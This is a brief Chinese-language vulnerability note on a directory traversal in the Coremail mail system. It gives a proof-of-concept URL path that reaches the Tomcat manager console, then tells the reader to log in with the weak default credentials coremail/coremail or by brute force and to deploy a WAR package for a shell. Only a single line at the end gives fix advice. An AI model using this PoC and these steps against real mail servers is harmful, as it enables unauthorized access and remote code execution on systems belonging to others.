# Coremail邮箱系统 目录穿越泄漏后台漏洞

## 漏洞复现

![](_v_images/Coremail邮箱系统目录穿越泄漏后台漏洞/media/1.png)

`POC:url+/lunkr/cache/;/;/../../manager.html`

![](_v_images/Coremail邮箱系统目录穿越泄漏后台漏洞/media/2.png)

访问过去会直接跳转到tomcat控制台，这里你就可以采用coremail/coremail弱口令尝试登陆，或者暴力破解。然后就是部署war包Getshell就ok了。

修复建议：对外隐藏tomcat控制台，修改默认口令。

![](_v_images/Coremail邮箱系统目录穿越泄漏后台漏洞/media/3.png)